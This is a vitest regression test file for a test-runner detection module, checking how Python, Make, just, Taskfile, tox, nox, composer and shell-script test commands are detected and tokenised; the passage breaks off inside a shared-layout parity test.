/**
 * Regression tests for detectTestRunners — cluster C19.
 *
 * Root cause: bare `pytest` emitted by admin_onboard.py and bare VM PATH
 * means `python3 -m pytest` is the only reliable invocation. Ensure that
 * (a) BuildConfig paths carrying "pytest" (bare) are NOT split into a bare
 *     `pytest` cmd, and (b) auto-detection paths always emit `python3 -m pytest`.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import { readFile } from 'node:fs/promises';
import {
  detectTestRunners, detectAutoTestRunners, describeRunnerDirectory,
  classifySetupFailure, classifyTestExecution, extractTestCoverage,
  extractLineCoverage, extractChangedLineCoverage,
  matchesEnvironmentFailureSignature,
  detectAcceptanceProbes, classifyProbeOutcome, buildWroteNewOutput,
  detectProvisioningSteps,
  isSafeDocumentedCommand, isAllowlistedRunnerShape, discoverDocumentedCommands,
  MAX_DOCUMENTED_COMMANDS,
  discoverNewlyDisabledTests, isTestFilePath, MAX_DISABLED_TEST_MARKERS,
  buildAcceptanceTestRunner, classifyAcceptanceTestRun,
  effectiveTestCmd, effectiveBuildCmd, effectiveInstallCmd,
} from './test-runners.js';
import type { BuildConfig, TestRunner, DirectoryConfig } from './test-runners.js';

// We test detectTestRunners in isolation.  fs.existsSync and fs.readFileSync
// are mocked per-test so the real filesystem is never consulted.
// (vi.mock is hoisted above the imports, so the static `import fs`/detectTestRunners
//  above already see the mocked module — no per-test require() needed. The old
//  CJS require('fs')/require('./test-runners.js') idiom does not resolve under
//  this ESM/vitest setup and crashed every test.)
vi.mock('fs', () => ({
  default: {
    existsSync: vi.fn(() => false),
    readFileSync: vi.fn(() => ''),
    readdirSync: vi.fn(() => []),
  },
}));

// Handle to the mocked fs default export for per-test stubbing. Typed loosely
// (the mock factory only defines existsSync/readFileSync) so the test bodies can
// stub with `(p: string) => …` predicates without fighting fs's PathLike overloads.
const mockFs = fs as unknown as {
  existsSync: ReturnType<typeof vi.fn>;
  readFileSync: ReturnType<typeof vi.fn>;
  readdirSync: ReturnType<typeof vi.fn>;
};
const WORKSPACE = process.env.AGENT_WORKSPACE || '/tmp/workspace';

type RunnerFamily =
  | 'pytest'
  | 'npm'
  | 'cargo'
  | 'make'
  | 'just'
  | 'task'
  | 'tox'
  | 'nox'
  | 'go'
  | 'ruby'
  | 'gradle'
  | 'maven'
  | 'elixir'
  | 'dotnet'
  | 'php'
  | 'composer'
  | 'swift'
  | 'scala'
  | 'bazel'
  | 'haskell'
  | 'flutter'
  | 'script'
  | null;

type LayoutFixture = {
  name: string;
  files: Array<{
    path: string;
    content?: string;
  }>;
  detectable: boolean;
  family: RunnerFamily;
  // Per-detector expected families for multi-manifest / root+nested layouts on
  // which the two no-CI detectors legitimately diverge in the auto-detection
  // fallback (see the parity test comment). When absent, the single-manifest
  // layout's lone `family` is the expected agent multiset.
  agent_families?: RunnerFamily[];
  // The onboarding (backend) detector's expected families — consumed by the
  // Python parity test (test_onboard.py::test_shared_layout_parity); declared
  // here only to keep the shared TS fixture type total.
  onboard_families?: RunnerFamily[];
  // Expected provisioning step command (cmd + args joined) from
  // detectProvisioningSteps — present only for layouts where the manifest that
  // triggers the suite detector also unconditionally triggers a provision step.
  // Consumed by the provision/probe parity describe block below.
  provision_cmd?: string;
  // Expected acceptance probe command (cmd + args joined) from
  // detectAcceptanceProbes — present only for compiled-language layouts that
  // have a cheap compile check. Consumed by the provision/probe parity block.
  probe_cmd?: string;
};

const sharedLayouts = JSON.parse(
  await readFile(
    new URL('../../../backend/testing/__fixtures__/test_runner_layouts.json', import.meta.url),
    'utf-8',
  ),
) as LayoutFixture[];

// The single cross-language family→command source of truth, consumed BOTH here
// and by the backend table-vs-fixture / source-scan tests
// (AGENT_TEST_RUNNER_COMMANDS in backend/testing/test_invariants.py). Loading it
// the same way as the layout fixture lets the agent parity loop assert the FULL
// command string the detector emits — not just the family — at parity with the
// backend source-scan. The `script` family is dynamic-arg (bash <script>) and is
// asserted family-only, exactly as the backend's _AGENT_DYNAMIC_ARG_FAMILIES skip.
const runnerCommands = JSON.parse(
  await readFile(
    new URL('../../../backend/testing/__fixtures__/test_runner_commands.json', import.meta.url),
    'utf-8',
  ),
) as Record<string, string>;
const DYNAMIC_ARG_FAMILIES = new Set(['script']);

function toWorkspaceRelativePath(p: string): string {
  const prefix = `${WORKSPACE}/`;
  return p.startsWith(prefix) ? p.slice(prefix.length) : p;
}

function familyFromRunner(runner: TestRunner): LayoutFixture['family'] {
  if (runner.cmd === 'python3' && runner.args[0] === '-m' && runner.args[1] === 'pytest') {
    return 'pytest';
  }
  if (runner.cmd === 'npm' && runner.args[0] === 'test') {
    return 'npm';
  }
  if (runner.cmd === 'cargo' && runner.args[0] === 'test') {
    return 'cargo';
  }
  if (runner.cmd === 'go' && runner.args[0] === 'test') {
    return 'go';
  }
  if (runner.cmd === 'make' && runner.args[0] === 'test') {
    return 'make';
  }
  if (runner.cmd === 'just' && runner.args[0] === 'test') {
    return 'just';
  }
  if (runner.cmd === 'task' && runner.args[0] === 'test') {
    return 'task';
  }
  if (runner.cmd === 'tox') {
    return 'tox';
  }
  if (runner.cmd === 'nox') {
    return 'nox';
  }
  if (runner.cmd === 'go' && runner.args[0] === 'test') {
    return 'go';
  }
  if (runner.cmd === 'bundle' && runner.args.join(' ') === 'exec rake test') {
    return 'ruby';
  }
  if (runner.cmd === './gradlew' && runner.args[0] === 'test') {
    return 'gradle';
  }
  if (runner.cmd === 'mvn' && runner.args[0] === 'test') {
    return 'maven';
  }
  if (runner.cmd === 'mix' && runner.args[0] === 'test') {
    return 'elixir';
  }
  if (runner.cmd === 'dotnet' && runner.args[0] === 'test') {
    return 'dotnet';
  }
  if (runner.cmd === 'vendor/bin/phpunit') {
    return 'php';
  }
  if (runner.cmd === 'composer' && runner.args[0] === 'test') {
    return 'composer';
  }
  if (runner.cmd === 'swift' && runner.args[0] === 'test') {
    return 'swift';
  }
  if (runner.cmd === 'sbt' && runner.args[0] === 'test') {
    return 'scala';
  }
  if (runner.cmd === 'bazel' && runner.args[0] === 'test') {
    return 'bazel';
  }
  if (runner.cmd === 'cabal' && runner.args[0] === 'test') {
    return 'haskell';
  }
  if (runner.cmd === 'flutter' && runner.args[0] === 'test') {
    return 'flutter';
  }
  if (runner.cmd === 'bash') {
    return 'script';
  }
  return null;
}

// child_process.execSync is used only by isDockerAvailable — always return normally
// (Docker "available") to keep tests deterministic.
vi.mock('child_process', () => ({
  execSync: vi.fn(() => ''),
}));

// ── effectiveTestCmd / effectiveBuildCmd / effectiveInstallCmd helpers ──────

describe('effectiveTestCmd', () => {
  it('returns confirmed_test_cmd when non-empty and commands_stale is false', () => {
    const dir: DirectoryConfig = { path: 'backend', type: 'python', test_cmd: 'pytest', confirmed_test_cmd: 'python3 -m pytest -x', commands_stale: false };
    expect(effectiveTestCmd(dir)).toBe('python3 -m pytest -x');
  });

  it('returns confirmed_test_cmd when commands_stale is undefined', () => {
    const dir: DirectoryConfig = { path: 'backend', type: 'python', test_cmd: 'pytest', confirmed_test_cmd: 'python3 -m pytest -x' };
    expect(effectiveTestCmd(dir)).toBe('python3 -m pytest -x');
  });

  it('falls back to test_cmd when commands_stale is true', () => {
    const dir: DirectoryConfig = { path: 'backend', type: 'python', test_cmd: 'pytest', confirmed_test_cmd: 'python3 -m pytest -x', commands_stale: true };
    expect(effectiveTestCmd(dir)).toBe('pytest');
  });

  it('falls back to test_cmd when confirmed_test_cmd is empty string', () => {
    const dir: DirectoryConfig = { path: 'backend', type: 'python', test_cmd: 'pytest', confirmed_test_cmd: '' };
    expect(effectiveTestCmd(dir)).toBe('pytest');
  });

  it('returns undefined when neither confirmed nor detected command exists', () => {
    const dir: DirectoryConfig = { path: 'backend', type: 'python' };
    expect(effectiveTestCmd(dir)).toBeUndefined();
  });
});

describe('effectiveBuildCmd', () => {
  it('returns confirmed_build_cmd when non-empty and not stale', () => {
    const dir: DirectoryConfig = { path: 'app', type: 'node', build_cmd: 'npm run build', confirmed_build_cmd: 'npm run build:prod', commands_stale: false };
    expect(effectiveBuildCmd(dir)).toBe('npm run build:prod');
  });

  it('falls back to build_cmd when commands_stale is true', () => {
    const dir: DirectoryConfig = { path: 'app', type: 'node', build_cmd: 'npm run build', confirmed_build_cmd: 'npm run build:prod', commands_stale: true };
    expect(effectiveBuildCmd(dir)).toBe('npm run build');
  });

  it('falls back to build_cmd when confirmed_build_cmd is empty string', () => {
    const dir: DirectoryConfig = { path: 'app', type: 'node', build_cmd: 'npm run build', confirmed_build_cmd: '' };
    expect(effectiveBuildCmd(dir)).toBe('npm run build');
  });
});

describe('effectiveInstallCmd', () => {
  it('returns confirmed_install_cmd when non-empty and not stale', () => {
    const dir: DirectoryConfig = { path: 'app', type: 'node', install_cmd: 'npm install', confirmed_install_cmd: 'npm ci', commands_stale: false };
    expect(effectiveInstallCmd(dir)).toBe('npm ci');
  });

  it('falls back to install_cmd when commands_stale is true', () => {
    const dir: DirectoryConfig = { path: 'app', type: 'node', install_cmd: 'npm install', confirmed_install_cmd: 'npm ci', commands_stale: true };
    expect(effectiveInstallCmd(dir)).toBe('npm install');
  });
});

describe('detectTestRunners — confirmed command precedence', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  it('uses confirmed_test_cmd when fresh (commands_stale=false)', () => {
    const buildConfig: BuildConfig = {
      directories: [{
        path: 'backend',
        type: 'python',
        test_cmd: 'pytest',
        confirmed_test_cmd: 'python3 -m pytest -x -q',
        commands_stale: false,
      }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  it('falls back to test_cmd when commands_stale=true', () => {
    const buildConfig: BuildConfig = {
      directories: [{
        path: 'backend',
        type: 'python',
        test_cmd: 'pytest',
        confirmed_test_cmd: 'python3 -m pytest -x -q',
        commands_stale: true,
      }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('pytest');
  });

  it('uses confirmed_install_cmd when fresh', () => {
    const buildConfig: BuildConfig = {
      directories: [{
        path: 'backend',
        type: 'python',
        test_cmd: 'pytest',
        install_cmd: 'pip install -r requirements.txt',
        confirmed_test_cmd: 'pytest',
        confirmed_install_cmd: 'pip install -r requirements-confirmed.txt',
        commands_stale: false,
      }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].installCmd).toBe('pip install -r requirements-confirmed.txt');
  });

  it('falls back to install_cmd when commands_stale=true', () => {
    const buildConfig: BuildConfig = {
      directories: [{
        path: 'backend',
        type: 'python',
        test_cmd: 'pytest',
        install_cmd: 'pip install -r requirements.txt',
        confirmed_install_cmd: 'pip install -r requirements-confirmed.txt',
        commands_stale: true,
      }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].installCmd).toBe('pip install -r requirements.txt');
  });

  it('backward compat: directory with no confirmed fields behaves exactly as before', () => {
    const buildConfig: BuildConfig = {
      directories: [{
        path: 'backend',
        type: 'python',
        test_cmd: 'pytest -x',
      }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('pytest');
    expect(runners[0].args).toEqual(['-x']);
  });
});

describe('detectTestRunners — bare pytest guard (C19)', () => {
  beforeEach(() => {
    // clearAllMocks (not resetAllMocks) so the vi.mock('fs') factory's default
    // export is preserved — resetAllMocks wipes the factory, leaving
    // fs.default undefined and crashing the per-test setup below.
    vi.clearAllMocks();
    // Default: no files exist
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  // --------------------------------------------------------------------------
  // BuildConfig path (admin_onboard.py-sourced test_cmd)
  // --------------------------------------------------------------------------

  it('BuildConfig test_cmd="pytest" (bare) splits to cmd=pytest — DOES NOT emit python3 -m pytest', () => {
    // This test documents the CURRENT behaviour of the split-based BuildConfig
    // path: the bare "pytest" token is taken as the cmd directly.
    // Fixing this path at the onboard level (admin_onboard.py emitting
    // "python3 -m pytest") is the correct root fix — see companion test below.
    const buildConfig: BuildConfig = {
      directories: [{ path: './', type: 'python', test_cmd: 'pytest' }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    // With bare "pytest" the cmd splits to "pytest", NOT "python3"
    expect(runners[0].cmd).toBe('pytest');
    expect(runners[0].args).toEqual([]);
  });

  it('BuildConfig test_cmd="python3 -m pytest" correctly produces cmd=python3 args=[-m,pytest]', () => {
    // This is what admin_onboard.py now emits after the C19 fix.
    // The split path then yields the correct invocation for bare-VM execution.
    const buildConfig: BuildConfig = {
      directories: [{ path: './', type: 'python', test_cmd: 'python3 -m pytest' }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest']);
    expect(runners[0].label).toContain('python3 -m pytest');
  });

  it('BuildConfig test_cmd="python3 -m pytest -x -q" preserves all args', () => {
    const buildConfig: BuildConfig = {
      directories: [{ path: 'backend/', type: 'python', test_cmd: 'python3 -m pytest -x -q' }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  it('BuildConfig test_cmd with a QUOTED argument tokenizes round-trip (no whole-dir drop)', () => {
    // `pytest -k "not slow"` must NOT be naively whitespace-split (that would
    // yield args ['-k','"not','slow"'] and run the wrong selector); the
    // quote-aware tokenizer keeps "not slow" as one arg. Runs via execFile, so
    // no shell is needed for a plain (operator-free) quoted command.
    const buildConfig: BuildConfig = {
      directories: [{ path: 'svc', type: 'python', test_cmd: 'pytest -k "not slow"' }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('pytest');
    expect(runners[0].args).toEqual(['-k', 'not slow']);
  });

  it('BuildConfig test_cmd with shell operators wraps in `bash -c` so it runs verbatim', () => {
    // `go test ./... && go vet ./...` needs a real shell for `&&`. It is wrapped
    // as a single bash -c argv element (execFile, no re-interpretation) instead
    // of being dropped — which previously produced a false 'no tests detected'.
    const buildConfig: BuildConfig = {
      directories: [{ path: 'core', type: 'go', test_cmd: 'go test ./... && go vet ./...' }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('bash');
    expect(runners[0].args).toEqual(['-c', 'go test ./... && go vet ./...']);
  });

  it('BuildConfig install_cmd is threaded onto the detected runner verbatim', () => {
    const buildConfig: BuildConfig = {
      directories: [{
        path: 'svc',
        type: 'python',
        test_cmd: 'python3 -m pytest -x -q',
        install_cmd: 'python3 -m pip install -e . && python3 -m pip check',
      }],
    };
    const runners = detectTestRunners(buildConfig);
    expect(runners).toHaveLength(1);
    expect(runners[0].installCmd).toBe('python3 -m pip install -e . && python3 -m pip check');
  });

  it('classifyTestExecution treats Go empty-package output as no_tests', () => {
    expect(classifyTestExecution('?    example.com/foo [no test files]')).toBe('no_tests');
  });

  it('classifyTestExecution treats filtered-out Go output as no_tests', () => {
    expect(classifyTestExecution('testing: warning: no tests to run\nok  example.com/foo 0.004s [no tests to run]')).toBe('no_tests');
  });

  it('classifyTestExecution treats Rust zero-test summary as no_tests', () => {
    expect(classifyTestExecution([
      'running 0 tests',
      '',
      'test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s',
    ].join('\n'))).toBe('no_tests');
  });

  it('classifyTestExecution keeps mixed Go output with real tests as ran', () => {
    expect(classifyTestExecution([
      '?    example.com/foo [no test files]',
      'ok   example.com/bar  0.021s',
    ].join('\n'))).toBe('ran');
  });

  // --------------------------------------------------------------------------
  // Auto-detection path (no BuildConfig)
  // --------------------------------------------------------------------------

  it('auto-detection for pytest.ini at root emits python3 -m pytest, not bare pytest', () => {
    const fs = mockFs;
    // Only pytest.ini exists at root
    fs.existsSync.mockImplementation((p: string) => p.endsWith('pytest.ini') && !p.includes('/backend/'));
    fs.readFileSync.mockReturnValue('');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  it('auto-detection for pyproject.toml with pytest at root emits python3 -m pytest', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('pyproject.toml') && !p.includes('/backend/'));
    fs.readFileSync.mockImplementation((p: string) => {
      if (p.endsWith('pyproject.toml')) return '[tool.pytest.ini_options]\n';
      return '';
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  it('auto-detection for bare pyproject.toml at root emits no runner', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('pyproject.toml') && !p.includes('/backend/'));
    fs.readFileSync.mockImplementation((p: string) => {
      if (p.endsWith('pyproject.toml')) return '[build-system]\nrequires = ["setuptools>=68"]\n';
      return '';
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('auto-detection for setup.cfg with pytest at root emits python3 -m pytest', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/setup.cfg') && !p.includes('/backend/'));
    fs.readFileSync.mockImplementation((p: string) => {
      if (p.endsWith('setup.cfg')) return '[tool:pytest]\naddopts = -q\n';
      return '';
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  it('auto-detection for bare setup.cfg or setup.py at root emits no runner', () => {
    const fs = mockFs;

    for (const manifest of ['setup.cfg', 'setup.py']) {
      vi.clearAllMocks();
      fs.existsSync.mockImplementation((p: string) => p.endsWith(`/${manifest}`) && !p.includes('/backend/'));
      fs.readFileSync.mockImplementation((p: string) => {
        if (p.endsWith('setup.cfg')) return '[metadata]\nname = demo\n';
        return '';
      });

      const runners = detectTestRunners(undefined);

      expect(runners, `manifest ${manifest}`).toHaveLength(0);
    }
  });

  it('auto-detection for backend/pytest.ini WITHOUT test-backend.sh emits python3 -m pytest', () => {
    const fs = mockFs;
    // backend/pytest.ini exists, but scripts/test-backend.sh does NOT
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/backend/pytest.ini'));
    fs.readFileSync.mockReturnValue('');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  it('auto-detection for backend/pytest.ini WITH test-backend.sh uses the shell script instead', () => {
    // When scripts/test-backend.sh exists the Docker path takes priority over bare pytest.
    // This is the Blueprint-self-repo path — must be unchanged.
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) =>
      p.endsWith('/backend/pytest.ini') || p.endsWith('/scripts/test-backend.sh')
    );
    fs.readFileSync.mockReturnValue('');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('bash');
    expect(runners[0].args[0]).toBe('scripts/test-backend.sh');
  });

  it('auto-detection for backend/pyproject.toml WITHOUT test-backend.sh emits python3 -m pytest', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/backend/pyproject.toml'));
    fs.readFileSync.mockImplementation((p: string) => {
      if (p.endsWith('pyproject.toml')) return '[tool.pytest]\n';
      return '';
    });

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest', '-x', '-q']);
  });

  // --------------------------------------------------------------------------
  // No bare "pytest" runner is ever emitted by auto-detection
  // --------------------------------------------------------------------------

  it('no auto-detected runner ever has cmd="pytest" (bare)', () => {
    // Exhaustive check: exercise all Python auto-detection branches and confirm
    // none produce a bare "pytest" runner.
    const scenarios: Array<(p: string) => boolean> = [
      (p) => p.endsWith('pytest.ini') && !p.includes('/backend/'),
      (p) => p.endsWith('/backend/pytest.ini'),
      (p) => p.endsWith('pyproject.toml') && !p.includes('/backend/'),
      (p) => p.endsWith('/backend/pyproject.toml'),
    ];

    const fs = mockFs;

    for (const existsFn of scenarios) {
      fs.existsSync.mockImplementation(existsFn);
      fs.readFileSync.mockImplementation(() => '[tool.pytest]\n');
      const runners = detectTestRunners(undefined);
      for (const r of runners) {
        expect(r.cmd, `bare "pytest" cmd found in runner: ${JSON.stringify(r)}`).not.toBe('pytest');
      }
      vi.clearAllMocks();
      fs.existsSync.mockReturnValue(false);
    }
  });
});

describe('detectTestRunners — generic external-repo fallbacks (make/tox/nox/scripts)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  it('Makefile with a real `test:` target → make test (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Makefile'));
    fs.readFileSync.mockReturnValue('build:\n\tgo build\n\ntest:\n\tgo test ./...\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('make');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('Makefile present but NO test target → no make runner emitted', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Makefile'));
    fs.readFileSync.mockReturnValue('build:\n\tgo build\n\nlint:\n\tgolangci-lint run\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('Makefile whose only target is `test-integration:` (prefix, not exact) → no make runner', () => {
    // `make test` only runs an EXACT `test` target; a prefixed target name
    // would fail with "No rule to make target test". This must match the
    // backend onboarding detector's strict `^test\s*:` semantics.
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Makefile'));
    fs.readFileSync.mockReturnValue('test-integration:\n\tgo test ./...\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('Makefile with an indented `\\ttest:` target (a recipe line, not a target) → no make runner', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Makefile'));
    fs.readFileSync.mockReturnValue('build:\n\tgo build\n\ttest:\n\t\tgo test ./...\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('justfile with a prefixed `test-all:` target IS still detected (loose just/Task semantics retained)', () => {
    // The just/Taskfile path is INTENTIONALLY looser than Makefile and must be
    // left unchanged — a prefixed target name still justifies `just test`.
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/justfile'));
    fs.readFileSync.mockReturnValue('test-all:\n\tcargo test\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('just');
  });

  it('justfile/Justfile with a real `test:` target → just test (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/justfile') || p.endsWith('/Justfile'));
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('/justfile') ? 'test:\n\tcargo test\n' : 'build:\n\tcargo build\n',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('just');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('Taskfile.yml/Taskfile.yaml with a real `test:` task → task test (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/Taskfile.yml') || p.endsWith('/Taskfile.yaml'));
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('/Taskfile.yaml')
        ? "version: '3'\n\ntasks:\n  test:\n    cmds:\n      - go test ./...\n"
        : "version: '3'\n\ntasks:\n  build:\n    cmds:\n      - go build ./...\n",
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('task');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('lowercase `makefile` casing variant is recognized', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/makefile'));
    fs.readFileSync.mockReturnValue('test:\n\tpytest\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('make');
    expect(runners[0].args).toEqual(['test']);
  });

  it('GNUmakefile casing variant is recognized', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/GNUmakefile'));
    fs.readFileSync.mockReturnValue('test :\n\tpytest\n');

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('make');
  });

  it('tox.ini → tox (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/tox.ini'));

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('tox');
    expect(runners[0].args).toEqual([]);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('noxfile.py → nox (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/noxfile.py'));

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('nox');
    expect(runners[0].args).toEqual([]);
  });

  it('root-level ./test.sh → bash test.sh (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/test.sh') && !p.includes('scripts/'));

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('bash');
    expect(runners[0].args).toEqual(['test.sh']);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('run-tests.sh / run_tests.sh / scripts/test.sh are each recognized', () => {
    const fs = mockFs;
    for (const script of ['run-tests.sh', 'run_tests.sh', 'scripts/test.sh']) {
      vi.clearAllMocks();
      fs.existsSync.mockImplementation((p: string) => p.endsWith(`/${script}`));
      const runners = detectTestRunners(undefined);
      expect(runners, `script ${script}`).toHaveLength(1);
      expect(runners[0].cmd).toBe('bash');
      expect(runners[0].args).toEqual([script]);
    }
  });

  it('composer.json with scripts.test → composer test (root)', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/composer.json'));
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('composer.json') ? JSON.stringify({ scripts: { test: 'phpunit' } }) : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('composer');
    expect(runners[0].args).toEqual(['test']);
    expect(runners[0].cwd).toBe(WORKSPACE);
  });

  it('bare composer.json without scripts.test emits no runner', () => {
    const fs = mockFs;
    fs.existsSync.mockImplementation((p: string) => p.endsWith('/composer.json'));
    fs.readFileSync.mockImplementation((p: string) =>
      p.endsWith('composer.json') ? JSON.stringify({ scripts: { lint: 'phpcs' } }) : '',
    );

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('a repo with none of these (and no Blueprint markers) yields NO runner', () => {
    const fs = mockFs;
    fs.existsSync.mockReturnValue(false);

    const runners = detectTestRunners(undefined);

    expect(runners).toHaveLength(0);
  });

  it('stored build_config test_cmd takes precedence — generic fallbacks do not fire', () => {
    const fs = mockFs;
    // Makefile + tox.ini + test.sh all present on disk...
    fs.existsSync.mockReturnValue(true);
    fs.readFileSync.mockReturnValue('test:\n\tpytest\n');

    const buildConfig: BuildConfig = {
      directories: [{ path: './', type: 'python', test_cmd: 'python3 -m pytest' }],
    };
    const runners = detectTestRunners(buildConfig);

    // ...but a stored test_cmd suppresses every auto-detection fallback.
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('python3');
    expect(runners[0].args).toEqual(['-m', 'pytest']);
  });

  it('Blueprint backend pytest precedence — Makefile fallback does not override scripts/test-backend.sh', () => {
    const fs = mockFs;
    // Both a Blueprint backend layout AND a generic Makefile are present.
    fs.existsSync.mockImplementation((p: string) =>
      p.endsWith('/backend/pytest.ini') ||
      p.endsWith('/scripts/test-backend.sh') ||
      p.endsWith('/Makefile')
    );
    fs.readFileSync.mockReturnValue('test:\n\tpytest\n');

    const runners = detectTestRunners(undefined);

    // The Blueprint-specific backend runner wins; the make fallback never fires.
    expect(runners).toHaveLength(1);
    expect(runners[0].cmd).toBe('bash');
    expect(runners[0].args[0]).toBe('scripts/test-backend.sh');
  });
});

describe('detectTestRunners — shared layout parity fixtures', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFs.existsSync.mockReturnValue(false);
    mockFs.readFileSync.mockReturnValue('');
    mockFs.readdirSync.mockReturnValue([]);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  for (const layout of sharedLayouts) {
    it(layout.name, () => {
      const filesByPath = new Map(layout.files.map((item) => [item.path, item]));
      const fsMock = mockFs;

      // Synthesize a directory tree from the flat fixture paths so the nested
      // monorepo scan (readdirSync of services/apps/packages/src containers)
      // sees the same layout the backend BFS walks. `dirChildren` maps a
      // directory rel-path to its immediate child names; `allDirs` is every
      // intermediate directory so existsSync(container) is true.
